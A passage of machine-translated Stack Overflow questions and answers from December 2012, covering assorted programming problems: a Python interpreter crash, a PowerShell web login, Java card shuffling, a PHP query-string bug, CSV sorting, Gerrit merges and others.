没有其他追溯或信息。它使我们的应用程序崩溃（几分钟后它会自动重新启动）。我们在开发中从未遇到过这个问题。

编辑：我已经检查过了，我的 python 应用程序内存太高了，这可能是一个相关的问题

## 我试过的

问题是，当我尝试交叉引用访问日志时，没有任何内容与访问时间相对应。

正如我所说，没有关于错误的回溯或信息。

所以，我首先搜索了什么是 Python 中的块堆栈下溢，我发现了这篇非常有趣的文章：[http](http://tech.blog.aknin.name/2010/07/22/pythons-innards-interpreter-stacks/) ://tech.blog.aknin.name/2010/07/22/pythons-innards-interpreter-stacks/它解释了什么*是*块堆栈下溢。

编辑：我还尝试删除所有 .pyc 并重新启动服务器。没有结果

## 问题

所以，这是我的问题：什么可能导致编译器中的块堆栈下溢？什么“类型”的代码会导致这种情况？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-07T02:40:30.170

首先，尝试删除所有`.pyc`文件（`.pyo`如果有的话），然后重新启动服务器。如果它没有帮助，请将问题报告给[http://bugs.python.org/](http://bugs.python.org/) --- 它看起来真的像一个 Python 错误。我能想到的唯一方法是使用晦涩的技巧，例如生成自定义字节码序列。

如果您无法发布让我们重现问题的方法，您也可以尝试在 Python 源代码中的 PyFrame_BlockPop() 中编辑 Objects/frameobject.c，以在崩溃前显示更多信息。至少`_PyObject_Dump(f); _PyObject_Dump(f->f_code);`在定位错误所在方面很有用。

# wpf - 如何在 wpf 中实时将位图加载到 ImageSource？

> ID：13756062
> 
> 赞同：0
> 
> 时间：2012-12-07T02:28:04.540
> 
> 标签：wpf, bitmap, real-time, bitmapimage

我知道如何[从 System.Drawing.Bitmap 加载 WPF BitmapImage将位图转换为 BitmapImage](https://stackoverflow.com/questions/94456/load-a-wpf-bitmapimage-from-a-system-drawing-bitmap)

但是当我的位图发生变化时，我想要图像的来源，即BitmapImage会随着位图实时变化，我该怎么做？

我生成位图的代码是这样的：

```
Rectangle rect = new Rectangle(0, 0, 300, 300);
bitmap = new Bitmap(rect.Width, rect.Height);
Graphics g = Graphics.FromImage(bitmap);
DoWithGraphics(g, rect, pictureelements); 
```

DoWithGraphics 是一系列 g.FillRectangle
谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T08:17:11.670

[在Image](http://msdn.microsoft.com/en-us/library/system.windows.controls.image%28v=vs.110%29.aspx)控件中显示位图并在位图更改时更新[Source](http://msdn.microsoft.com/en-us/library/system.windows.controls.image.source.aspx)属性应该不是问题。

# powershell - powershell Invoke-WebRequest WebSession 不工作

> ID：13756065
> 
> 赞同：3
> 
> 时间：2012-12-07T02:28:21.907
> 
> 标签：powershell, web, httpwebrequest

我无法让以下代码工作。它似乎已登录，但随后返回带有 $response 的登录页面。我猜这与回发有关？有什么办法可以解决吗？谢谢！

```
$login = Invoke-WebRequest -Uri 'http://www.sqlpass.org/UserLogin.aspx' -SessionVariable sqlpass
$login.Forms[0].Fields["txtUsername_14615"] = 'myuser'
$login.Forms[0].Fields["txtPassword_14615"] = 'mypass'
$response = Invoke-WebRequest -Uri 'http://www.sqlpass.org/UserLogin.aspx' -WebSession $sqlpass -Method POST -Body $login 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T05:18:45.330

还有一个事件目标字段也需要设置，POST 也需要不同的 URL，我测试了下面的解决方案，它可以工作：

```
$login = Invoke-WebRequest -Uri 'http://www.sqlpass.org/UserLogin.aspx' -SessionVariable sqlpass
$form = $login.Forms[0]
$form.Fields["__EVENTTARGET"] = "UserLogin"
$form.Fields["txtUsername_14615"] = 'myuser'
$form.Fields["txtPassword_14615"] = 'mypass'
Invoke-WebRequest -Uri 'http://www.sqlpass.org/UserLogin.aspx?returnurl=%2fdefault.aspx' -WebSession $sqlpass -Method POST -Body $form.Fields 
```

注意：作为旁注，您可以使用像[Fiddler](http://www.fiddler2.com/fiddler2/)这样的 Web 调试代理来调试这样的问题，这正是我所做的。

# vb.net - VB.NET - GetWindowText() 为“编辑”类返回零

> ID：13756067
> 
> 赞同：1
> 
> 时间：2012-12-07T02:28:32.957
> 
> 标签：vb.net, winapi, external, handle, sendmessage

我正在尝试通过应用程序的控制句柄从另一个应用程序中检索文本。如果控件是“静态”的，我没有问题，但我的代码似乎不适用于“编辑”控件。正如 MSDN 所说，GetWindowText 无法从 EDIT 控件中检索文本，但也许您知道实现此目的的另一种方法？

我当前的代码在这里：

```
Dim newHwnd As IntPtr = Handler.GetClassByPosition(ParentHwnd, cls, classPosition)
    Dim length As Integer = Handler.GetWindowTextLength(newHwnd)
    Dim sb As New String(" ".Chars(0), length + 1)
    If cls = "edit" Then
        Handler.GetWindowText(newHwnd, sb, sb.Length)
    End If 
```

其中 GetClassByPosition 通过指定父句柄、类名（静态、编辑或按钮）和 classPosition（在循环中使用 - 现在不重要）返回控件的句柄

正如我所说，它适用于 STATIC（标签等），但如果我从该外部应用程序的 EDIT（文本框）控件中检索文本，它会返回 0。

**更新：**

我尝试了以下解决方案，如果数据是整数但如果它包含任何字母，则成功返回数据，结果为 0：

```
Dim tmpstr As IntPtr = Marshal.AllocHGlobal(100)
        Dim NumText = API.SendMessage(Hwnd, API.WM_GETTEXT, 200, tmpstr )
        NumText = Marshal.PtrToStringAnsi(tmpstr )
        Return NumText 
```

在此先感谢，尼古拉

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T02:37:50.780

尝试这个：

```
 Private Function GetText(ByVal hWnd As IntPtr) As String

    Dim ReturnValue As String = Nothing

    If hWnd.ToInt32 > 0 Then

        Dim Length As Integer = GetWindowTextLength(hWnd)

        If Length > 0 Then

            Dim sb As New System.Text.StringBuilder("", Length + 1)

            GetWindowText(hWnd, sb, sb.Capacity)

            ReturnValue = sb.ToString

            sb = Nothing

        End If

    End If

    Return ReturnValue

End Function 
```

# java - 如何打乱数组

> ID：13756068
> 
> 赞同：2
> 
> 时间：2012-12-07T02:28:45.617
> 
> 标签：java, playing-cards

我有一个关于如何洗牌的问题。**背景**是：编写一个记忆配对游戏
，它使用 16 张卡片，排列在一个 4*4 的正方形中，并标有从 1 到 8 的数字对。

**目前，我需要做的是初始化这些卡片并洗牌。**

而现在我能想到的就是创建一个Card类，包括从1到8的变量Rank，其次，命名一个新类（matchingGame）（随便你）并编写一个新的静态方法：shuffle()。

但我被困在这一步。

**我的第一个问题**是如何初始化这 16 张卡（8 对）？
（我认为我的代码不是有效的方法）。

**我的第二个问题**是初始化后如何洗牌？

我的代码是：

```
public class Card 
{
private int rank;

public Card(int iniRank)
{
    switch (iniRank)
    {
    case 1:
        rank =1;
        break;
    case 2:
        rank =2;
        break;
    case 3:
        rank =3;
        break;
    case 4:
        rank =4;
        break;
    case 5:
        rank =5;
        break;
    case 6:
        rank =6;
        break;
    case 7:
        rank =7;
        break;
    case 8:
        rank =8;
        break;
    }
}

public int getRank()
{
    return rank;
}

}

public static void initialize(Card[] cards)
{
    for (int i=0;i<2;i++)
    {
        cards[i] = new Card(1);
    }
    for (int i=2;i<4;i++)
    {
        cards[i] = new Card(2);
    }
....
} 
```

谢谢大家对我之前的问题！
在同一背景下还有一个问题，作为您的好建议，您知道如何洗牌一维数组吗？

**但是如何洗牌一个二维数组？**显然，我不能使用

```
List<Card> newcards = Arrays.asList(cards) 
```

现在转换为列表。

感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T02:38:08.703

您初始化数组的方法基本上是正确的：遍历数组并在每个点添加一个新实例。

```
Card[] cards = ...;
for (int i = 0; i < cards.length; i++)
    cards[i] = ...  // new Card instance 
```

现在洗牌 - 不要重新发明轮子：使用[`Collections.shuffle`](http://docs.oracle.com/javase/7/docs/api/java/util/Collections.html#shuffle%28java.util.List%29)：

```
Card[] cards = ...;
List<Card> l = Arrays.asList(cards);
Collections.shuffle(l); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T02:33:33.163

`switch`正如我认为您已经意识到的那样，无需在构造函数中使用语句。直接给 int 参数赋值`rank`即可。

我也不确定你的初始化方法发生了什么。您创建了一个循环两次，以创建一定等级的卡片？

就洗牌而言，您可能想看看[Knuth shuffle](http://en.wikipedia.org/wiki/Knuth_shuffle)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T02:38:35.473

如果您以线性方式考虑卡片位置（即从左到右、从上到下的单个网格位置列表），您可以简单地使用[`shuffle()`](http://docs.oracle.com/javase/6/docs/api/java/util/Collections.html#shuffle%28java.util.List%29)Collections 实用程序类的方法：

```
List<Card> cards = new ArrayList<Card>();
// populate the list with what ever cards you want, how you want
Collections.shuffle(cards); 
```

然后将卡片显示为网格

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T02:35:57.847

我强烈建议实施[这个](http://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle)算法。

它是有效的、众所周知的和正确的。您会惊讶于后者的重要性 -[看到这个有趣的例子](http://www.cigital.com/papers/download/developer_gambling.php)，当赌场实施不正确的洗牌算法时会发生什么。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-07T02:49:23.287

我没有得到你的 switch 语句。你可以像这样创建一个 Card 类：

```
public class Card 
{
   private int rank;

   public Card(int iniRank){
      rank = iniRank;
   }

   public int getRank(){
      return rank;
   }
} 
```

比你创建matchingGame 类。添加 16 张牌然后洗牌。

```
public class matchingGame
{
   private List<Card> cards = null;

   public matchingGame(){
      cards = new ArrayList<Card>(16);
      for (int i=1; i<=8; i++)
      {
         cards.add(new Card(i));
         cards.add(new Card(i));
      }
   }

   public void shuffle()
   {
      //Shuffle algorithm here.
   }
} 
```

对于算法，我建议看这篇文章：[Java's Collections.shuffle is doing what?](https://stackoverflow.com/questions/2249520/javas-collections-shuffle-is-doing-what)

# php - PHP：$_GET 变量没有被正确读取

> ID：13756069
> 
> 赞同：1
> 
> 时间：2012-12-07T02:29:11.430
> 
> 标签：php, php4

我有 2 个 php 页面：editpost.php 只是生成一个表单来编辑用户评论。addcomment.php，在这种情况下应该更新那个帖子的 mysql。它只是测试是否设置了 $_GET['edit'] 和正确的变量。由于某种原因，它从未读过真的。我在 Safari 中检查了 editpost.php 的“查看源代码”，它看起来不错。

编辑帖子.php：

```
<?php 
require_once('checklogin.php');
//require_once('text_encode.php');
//die("Made it past require once");
if(isset($_SESSION['user'])&&isset($_GET['id']))
{
    //die("made it past if statement");
    $con = mysql_connect('localhost','REDACTED','REDACTED');
    mysql_select_db('dancks_db',$con);
    $q = mysql_query(sprintf("SELECT userID FROM UserTable WHERE nick='%s'",$_SESSION['user']),$con) or die(mysql_error());
    if(mysql_num_rows($q)!=1)
    {
        //die("1");
        redir();
    }
    else
    {
        $match = array(); $match2=array();
        preg_match("/[0-9]{1,5}/",$_GET['id'],$match);
        //preg_match("/[0-1]{1,1}/",$GET['type'],$match2);
        if(implode($match)!=$_GET['id'])
        {
            die("2");
            redir();
        }
        //if($_GET['id']==0)
        else
        {
            $q2 = mysql_query(sprintf("SELECT * FROM Comments WHERE CommentID='%s'",$_GET['id']),$con) or die(mysql_query());
            if(mysql_num_rows($q2)==1)
            {
                $vars = mysql_fetch_assoc($q2);
                echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
                <html xmlns=\"http://www.w3.org/1999/xhtml\">
                <head>
                <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
                <title>Edit Post</title>
                </head>
                <body>";
                echo "<form method=\"post\" action=\"addcomment.php?type=1,edit=1\">
                <p>Rating:";
        //die("rating: ".$q2['rating']);
        for($i=1;$i<6;$i++)
        {
            echo "<label>".$i."</label><input type=\"radio\" name=\"rating\" value=\"".$i."\" ";if($vars['rating']==$i){echo "checked=\"checked\"";}echo " id=\"star".$i."\" />\n";
        }
        echo"</p>
                <p>Title:<input type=\"text\" name=\"title\" value=\"".$vars['title']."\" /></p>
                <p>Comment:<textarea rows=\"5\" cols=\"80\" name=\"review\" >".$vars['review']."</textarea></p>
                <input type=\"hidden\" name=\"commentid\" value=\"".$_GET['id']."\" />
                <input type=\"hidden\" name=\"subject\" value=\"".$vars['subject']."\" />
                <input type=\"submit\" value=\"submit review\" />
                </form>
                </body>
                </html>";
            }
            else
            {
                die("No comment found: get: ".$_GET['id']);
            }
        }
        mysql_free_result($q);
    }
}
else
{
    die("3");
    redir();
}
?> 
```

添加评论.php：

```
<?php require_once('checklogin.php');
//die("type=".$_GET['type']." rating=".$_POST['rating']);
require_once('text_encode.php');
require_once('validate.php');
if(safe_isset($_GET['type'])&&safe_isset($_SESSION['user']))
{
    if( (safe_isset($_POST['rating']))&&(safe_isset($_POST['title']))&&(safe_isset($_POST['review']))&&($_GET['type']==1))
    {
        $match = array(); $match2 = array();
        preg_match("/[0-5]{1,1}/",$_POST['rating'],$match);
        preg_match("/[0-1]{1,1}/",$_GET['type'],$match2);
        if((implode($match)!=$_POST['rating'])&&(implode($match2)!=$_GET['type']))
        {
            die("type=".$_GET['type']." implode=".implode($match)." rating=".$_POST['rating']." implode=".implode($match2));
            //die("Invalid input for rating or type");
            redir();
        }
        else if( $_POST['rating']=="" || $_GET['type']=="" )
        {
            die("Rating or type reads empty string");
            redir();
        }
        else if(safe_isset($_GET['edit']))
        {
            $con = mysql_connect('localhost','REDACTED','REDACTED');
            mysql_select_db('dancks_db',$con);
            $query=sprintf("UPDATE Comments SET rating='%s', title='%s', review='%s' WHERE CommentID='%s'",
            mysql_real_escape_string($_POST['rating']),
            mysql_real_escape_string($_POST['title']),
            mysql_real_escape_string($_POST['review']),
            mysql_real_escape_string($_POST['commentid']));
            $r = mysql_query($query,$con) or die(mysql_error());
            mysql_close($con);
            die("Successful edit");
            header(sprintf("Location:http://example.com/redacted/redacted/seller.php?ID=%s",$_POST['subject']));
        }
        else
        {
            if(contains($_SERVER['HTTP_REFERER'],"editpost.php"))
            {
                die("Wrong spot");
            }
            $con = mysql_connect('localhost','REDACTED','REDACTED');
            mysql_select_db('dancks_db',$con);
            $query=sprintf("INSERT INTO Comments(nick,type,subject,rating,title,review) VALUES ('%s','%s','%s','%s','%s','%s')",
            mysql_real_escape_string($_SESSION['user']),
            mysql_real_escape_string($_GET['type']),
            mysql_real_escape_string($_POST['subject']),
            mysql_real_escape_string($_POST['rating']),
            mysql_real_escape_string($_POST['title']),
            mysql_real_escape_string($_POST['review']));
            $r = mysql_query($query,$con) or die(mysql_error());
            mysql_close($con);
            //die("successful insert");
            header(sprintf("Location:http://example.com/redacted/redacted/seller.php?ID=%s",$_POST['subject']));
        }
    }
    else
    {
        die("rating, title or review isnt set");
        redir();
    }
}
else
{
    die("type isnt set or user isnt logged in");
    redir();
}
?> 
```

相关的额外代码：

```
function contains($text,$match)
{
    return (preg_match("/".$match."/",$text)==1);
}
function safe_isset($text)
{
    $good = false;
    if(isset($text))
    {
        if(strlen($text)>0)
        {
            $good = true;
        }
    }
    return $good;
} 
```

这可能是我忽略的非常容易的事情。如果是这样的话，我很抱歉。我现在正在死记硬背，所以我很容易错过一些东西。或者也许欢迎我是否应该简单地重写或重组它的想法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-07T02:36:21.930

你是对的，这很简单。你需要一个`&`代替`,`

```
echo "<form method=\"post\" action=\"addcomment.php?type=1,edit=1\">
<p>Rating:";
// Should be:
echo "<form method=\"post\" action=\"addcomment.php?type=1&edit=1\">
<p>Rating:";
// -----------------------------------------------------^^^^ 
```

你有它的方式，`edit`值*是*传递的，但它是作为`type`值的一部分传递的，所以 PHP 看到

```
$_POST['type'] == '1,edit=1' 
```

我还注意到，稍后您正在寻找`$_GET['id']`，但您已`ID`在查询字符串中定义。数组键区分大小写，因此请务必使用正确的大小写。

```
header(sprintf("Location:http://example.com/redacted/redacted/seller.php?ID=%s",$_POST['subject']));
//---------------------------------------------------------------------^^^^ upper case here....
// Access as $_GET['ID'], not $_GET['id'] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T02:40:52.320

```
echo "<form method=\"post\" action=\"addcomment.php?type=1,edit=1\"> 
```

应该

```
echo "<form method=\"post\" action=\"addcomment.php?type=1&edit=1\"> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T02:38:40.607

```
"<form method=\"post\" action=\"addcomment.php?type=1,edit=1\">
                <p>Rating:";

USE &

 "<form method=\"post\" action=\"addcomment.php?type=1&edit=1\">
                <p>Rating:"; 
```

# facebook - Facebook 应用程序的特殊礼物实施？

> ID：13756071
> 
> 赞同：0
> 
> 时间：2012-12-07T02:29:16.977
> 
> 标签：facebook

示例：Bejeweled Blitz 经常举办活动和促销活动，点击后会将您带到他们的应用页面。到达那里后，该应用程序可以看到通过点击促销链接并分叉奖励到达了该页面。

这是怎么做到的？我需要做什么来实现类似的功能？据我所知，由于域不同（Facebook 与我的应用程序），父 URL 超出范围，那么消息是如何传递给应用程序的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-20T02:50:21.327

**每个应用程序（画布、页面选项卡）**
您可以通过将`app_data`参数传递给链接到 Facebook 应用程序的任何 URL 来获取数据。这个参数值将被添加到[`signed_request`](https://developers.facebook.com/docs/howtos/login/signed-request/).

因此，此 url`http://facebook.com/mypage/app_123?app_data=promotion12`将允许您`promotion12`通过`signed_request`.

在 PHP 中，这会给你这样的东西：

```
$signed_request = $facebook->getSignedRequest();
$app_data = $signed_request['app_data']; 
```

当然，你可以在那里传递任何字符串；例如，它可以是 JSON 字符串。

这确实是从应用程序外部到内部获取数据的核心。

希望这对您有所帮助！

**Canvas**
app 然而，在 Canvas 应用程序中，它要简单得多，每个查询参数都将传递给应用程序。

所以，`http://apps.facebook.com/myapp?somedata=hey`可以通过：

```
$data = $_GET['somedata']; 
```

Facebook 只会将这些参数附加到 iframe URL。

**文档**
[https://developers.facebook.com/docs/reference/login/signed-request/](https://developers.facebook.com/docs/reference/login/signed-request/)（很难找到，该死的 FB 文档）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-20T02:51:45.353

这是通过用户单击的 URL 中传递的查询参数完成的。一个明显的例子是[DoubleDownCasino](https://www.facebook.com/photo.php?fbid=568468006501389&set=a.367261799955345.103710.362774807070711&type=1)共享一个 URL 供用户点击。链接是：

> [http://apps.facebook.com/doubledowncasino/?pid=PNNTDP&target_url=pid%3APNNTDP](http://apps.facebook.com/doubledowncasino/?pid=PNNTDP&target_url=pid%3APNNTDP)

DoubleDownCasino 可能会做的是，一旦他们的画布应用程序加载，他们会解析查询参数的 URL，并且`pid`和`target_url`参数有助于确定用户获得的“奖励”类型。一旦他们兑换了它，点击相同的 URL 将不会再次获得奖励，因为它可以检查用户是否已经使用给定的`pid`和兑换了优惠`target_url`。

你的问题：

> 示例：Bejeweled Blitz 经常举办活动和促销活动，点击后会将您带到他们的应用页面。到达那里后，该应用程序可以看到通过点击促销链接并分叉奖励到达了该页面。

我上面解释的正是 Bejweled Blitz 在这篇[文章](https://www.facebook.com/bejeweledblitz/posts/395455267206036)中的做法。如果您通过 bit.ly 短 URL，该 URL 是：

> [http://apps.facebook.com/bejeweledblitz/?zgift=0/eTtVUuhF5ipdJmO1jlDhr96MtKjp1NYflJrcOddB6iZDH1y96K%2Bml6gC0%2B5yVN](http://apps.facebook.com/bejeweledblitz/?zgift=0/eTtVUuhF5ipdJmO1jlDhr96MtKjp1NYflJrcOddB6iZDH1y96K%2Bml6gC0%2B5yVN)

因此，为了回答您的问题，Bejeweled Blitz 通过附加查询参数（在本例中为 ）来运行促销和奖励，`zgift`然后他们可以通过获取用户正在点击的当前 URL 在他们的应用程序中解析这些参数。

# theory - 图灵可计算函数

> ID：13756075
> 
> 赞同：0
> 
> 时间：2012-12-07T02:30:16.323
> 
> 标签：theory, turing-machines

这里有几个真假问题：请有人回答这些问题：

1.  令 F(0) = 1，并令 F(n) = 2^F(n-1) 时 n>0。那么 F 图灵可计算吗？

2.  DPDA 不能接受具有不明确上下文无关语法的语言。这是真的 ？如果不是，那是哪种语法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T02:36:21.743

我猜第一个是真的。

根据 Church-Turing 论文，可计算函数正是在无限时间和存储空间的情况下，可以使用机械计算设备计算的函数。等效地，本文指出任何具有算法的函数都是可计算的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T02:55:17.103

对于（1），问自己这个问题：你能写一个可以计算这个函数的计算机程序吗？如果是这样，那么根据 Church-Turing 命题，你就知道一定有一个 TM 可以做同样的计算，所以这个函数是可计算的。如果不是，那么您知道没有 TM 也可以评估该函数。

对于 (2)，请记住歧义是*语法*的一个属性。同一种语言可以有多种语法。

希望这可以帮助！

# python - 两列 CSV 数据排序 - 一列 str（升序）另一列 date（降序）

> ID：13756076
> 
> 赞同：2
> 
> 时间：2012-12-07T02:30:26.140
> 
> 标签：python, csv, python-2.7, sorted

我有兴趣知道如何执行两列排序的 CSV 文件，其中一列升序，另一列降序，需要解析为可理解的日期格式。

```
import operator
import csv
import dateutil.parser as dparser

reader = csv.reader(open("2002_NASDAQ.csv"), delimiter=",")

sortedlist = sorted(reader, key=lambda k: (k[0], dparser.parse(k[1])), reverse=True)

with open('2002_NASDAQ_out.csv', 'wb') as f:
    csv.writer(f).writerows(sortedlist) 
```

如果我删除解析脚本运行没有错误。但是，如果没有正确格式的日期，结果将不符合预期（股票升序，日期降序）。

```
''' Sample sample.csv data
AAME,01-Jan-2002,2.204,2.204,2.204,2.204,0
AAON,01-Jan-2002,7.254,7.254,7.254,7.254,0
AAPL,01-Jan-2002,10.95,10.95,10.95,10.95,0
AAME,02-Jan-2002,5.71,5.71,5.71,5.71,0
AAON,02-Jan-2002,11.125,11.125,11.125,11.125,0
AAPL,02-Jan-2002,13.85,13.85,13.85,13.85,0
AAME,03-Jan-2002,28.82,28.82,28.82,28.82,0
AAON,03-Jan-2002,15.82,15.82,15.82,15.82,0
AAPL,03-Jan-2002,1.725,1.725,1.725,1.725,0
AAME,04-Jan-2002,5.3333,5.3333,5.3333,5.3333,0

''' Example sorted.csv data
AAME,04-Jan-2002,5.3333,5.3333,5.3333,5.3333,0
AAME,03-Jan-2002,28.82,28.82,28.82,28.82,0
AAME,02-Jan-2002,5.71,5.71,5.71,5.71,0
AAME,01-Jan-2002,2.204,2.204,2.204,2.204,0
AAON,03-Jan-2002,15.82,15.82,15.82,15.82,0
AAON,02-Jan-2002,11.125,11.125,11.125,11.125,0
 .
 .
 .
AAPL,03-Jan-2002,1.725,1.725,1.725,1.725,0
''' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T10:49:13.080

传统的做法是依靠 Python 的排序是稳定的，然后排序两次（注意先做第二个键）：

```
a = sorted(something, key=itemgetter(1), reverse=True)
a.sort(key=itemgetter(0)) 
```

**例子**

```
>>> a = [ (1, 2), (0, 1), (2, 1), (2, 7) ]
>>> a.sort(key=itemgetter(1), reverse=True)
>>> a.sort(key=itemgetter(0))
>>> a
[(0, 1), (1, 2), (2, 7), (2, 1)] 
```

**未经测试**

```
sortedlist = sorted(reader, key=lambda L: dparser.parse(L[1]), reverse=True)
sortedlist.sort(key=itemgetter(0)) 
```

# c++ - 使用成员变量的地址作为 ID

> ID：13756078
> 
> 赞同：0
> 
> 时间：2012-12-07T02:30:42.393
> 
> 标签：c++

我试图避免声明枚举或使用字符串。尽管这样做的理由似乎令人怀疑，但完整的解释是无关紧要的。

我的问题很简单。我可以使用成员变量的地址作为唯一 ID 吗？

更具体地说，要求是：

*   ID 不必序列化。
*   ID 将是受保护的成员 - 仅由拥有对象在内部使用（即使在相同的类实例之间也不会比较 ID）。
*   子类需要访问基类 ID，并且可以添加它们的新 ID。

所以第一个解决方案是这样的：

```
class SomeClass
{
    public:
        int mBlacks;

        void AddBlack( int aAge )
        {
            // Can &mBlacks be treated as a unique ID?
            // Will this always work?
            // Is void* the right type?
            void *iId = &mBlacks;

            // Do something with iId and aAge
            // Like push a struct of both to a vector.
        }
}; 
```

而第二种解决方案是这样的：

```
class SomeClass
{
    public:
        static int const *GetBlacksId()
        {
            static const int dummy = 0;
            return &dummy;
        }

        void AddBlack( int aAge )
        {
            // Do something with GetBlacksId and aAge
            // Like push a struct of both to a vector.
        }
}; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T02:43:43.073

此对象的任何其他`int`数据成员，以及同一进程中`mBlacks`不同实例的成员，都与该实例`SomeClass`的成员具有相同的地址。因此，您可以安全地将其用作流程中的唯一 ID。`mBlacks``SomeClass`

的空基类子对象`SomeClass`可以具有与 相同的地址`mBlacks`（如果`SomeClass`有任何空基类，则它没有），并且作为`char`的第一个字节的对象`mBlacks`具有与`mBlacks`. 除此之外，没有其他对象具有相同的地址。

`void*`将作为类型工作。`int*`也可以，但也许你想为不同的 id 使用不同类型的数据成员。

但是，此实例的 ID 是唯一的。同一类型的不同实例具有不同的 ID。您的一条评论表明这实际上不是您想要的。

如果您希望该类型的每个*值*都具有唯一的 ID，并且对于具有相同值的所有对象都具有相同的 ID，那么您最好从对象的所有重要字段中组合 ID。或者只是比较对象的相等性而不是它们的 ID，使用合适的`operator==`and `operator!=`。

或者，如果您希望 ID 唯一地标识一个值何时首次构造，*而不是*通过复制构造函数和复制赋值（以便作为相同“原始”副本的所有对象共享一个 ID），那么这样做的方法是在所有其他构造函数中分配一个新的唯一 ID，将其存储在数据成员中，并将其复制到复制构造函数和复制赋值运算符中。

获取新 ID 的规范方法是拥有一个 global[ `*`] 计数器，每次取值时都会递增该计数器。这可能需要使线程安全，具体取决于哪些程序使用该类（以及它们如何使用它）。然后，在给定的程序运行中，值将是唯一的，前提是计数器的类型足够大。

另一种方法是生成一个 128 位的随机数。这在理论上并不令人满意，但假设一个不错的随机源发生碰撞的机会并不比您的程序因某些不可避免的原因（如宇宙射线引起的数据损坏）而失败的机会大。当对象的来源广泛分布时（例如，如果您需要在不同进程或不同机器上唯一的 ID），随机 ID 比顺序 ID 更容易。如果您选择使用机器的 MAC 地址、随机数、时间、每个进程的全局 [ `*`] 计数器、PID 以及您想到并动手的任何其他内容（或[标准 UUID）的](https://en.wikipedia.org/wiki/Universally_unique_identifier)组合，则可以）。但这对于您的需求可能有点过头了。

[ `*`] 不必严格地是全局的——它可以是类的私有静态数据成员，或者是函数的静态局部变量。

# java - Java STM：关于 Multiverse STM 的问题

> ID：13756079
> 
> 赞同：2
> 
> 时间：2012-12-07T02:30:45.670
> 
> 标签：java, concurrency, akka, stm

我正在对 JVM 上的 STM 技术进行一些研究。阅读了一些文档后，我对 Multiverse 的实现有点困惑。

根据[Multiverse FAQ](http://multiverse.codehaus.org/faq.html#question.1)，Multiverse 不支持检测。然而，在接受其创始人 Peter Veentjer 的采访时，他有以下话要说：

> Multiverse 的使命之一是提供一个可以轻松与其他语言集成的 STM 实现，因此实际的 STM 实现只关心接口，因此您可以完全绕过插装。为了使它更容易，我提供了一个不依赖于仪器的托管参考。这是 Jonas Boner 在基于 Scala 的 Akka 项目中使用的方法。

这到底是什么意思？它是否使用字节码检测？

最后，我一直在阅读另一个关于 ScalaSTM 的文档[，](http://ppl.stanford.edu/papers/scaladays2010bronson.pdf)其中清楚地暗示了 Multiverse 使用字节码检测。

因此，我想知道是否有人可以告诉我关于 Multiverse 的实际工作原理。它是类似于 ScalaSTM 的运行时库，还是使用仪器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:11:28.537

由 Viktor 上面的 GitHub 链接回答

# git - 在 Gerrit 中，如何防止提交不完全最新的补丁集？

> ID：13756084
> 
> 赞同：8
> 
> 时间：2012-12-07T02:31:09.750
> 
> 标签：git, jenkins, gerrit

两个开发人员正在开发分支上进行两个完全不同的更改（例如，两个不同的文件）。他们都同时提交了他们的工作，触发了两个 Jenkins 构建。这些构建运行良好，但一个审查比另一个需要更长的时间。

第一个开发者提交了他们的补丁集，并且在开发中没有中间提交，因此 Gerrit 将其合并。

第二个开发者稍后提交他们的补丁集。虽然现在有一个中间提交，但合并本身是微不足道的，Gerrit 执行合并。

现在我们有两个构建，其中一个都不包含另一个的工作。

如果有任何中间提交，我想阻止第二次提交，即使合并完全是微不足道的，导致开发人员改为重新设置并更新他们的提交（并在此过程中触发 Jenkins 中的新构建）。

**当审查完成时，我在 Gerrit 中设置什么来阻止这种琐碎但不需要的合并，补丁集正在提交但目标分支上有中间合并？**

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-07T03:31:26.080

您可以将 Gerrit 中的项目选项更改为仅快进，这将阻止更改进入，因为它不是快进合并。然后强制 developer2 git pull --rebase 并再次推送，现在 developer1 所做的更改将成为验证的一部分。

# vba - 使用 VBA 将文本文件导入 Excel 到表格而不刷新所有内容

> ID：13756087
> 
> 赞同：0
> 
> 时间：2012-12-07T02:31:20.087
> 
> 标签：vba, excel

```
Sub ImportTextFile()
Dim rPaht As String
Dim rFileName As String
rPaht = Sheet1.Range("C9")
rFileName = Sheet1.Range("C10")
Range("G8").CurrentRegion.Offset(1, 0).Clear

With ActiveSheet.QueryTables.Add(Connection:= _
    "TEXT;" & rPaht & "\" & rFileName & ".txt", Destination:= _
    Range("$g$9"))
    .Name = Sheet1.Range("C10").Value
    .TextFilePlatform = 874
    .TextFileStartRow = 1
    .TextFileParseType = xlDelimited
    .TextFileOtherDelimiter = ":"
    .Refresh BackgroundQuery:=False
End With
Sheet1.Range("C9") = rPaht
Sheet1.Range("C10") = rFileName
End Sub 
```

这是我使用的代码。我遇到的问题是，每次我将一些文本文件导入表格时，它都会清除表格上的所有内容，包括表格行和格式

我想问一下是否有将文本文件导入我们想要的区域而不损害其他单元格

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:49:33.017

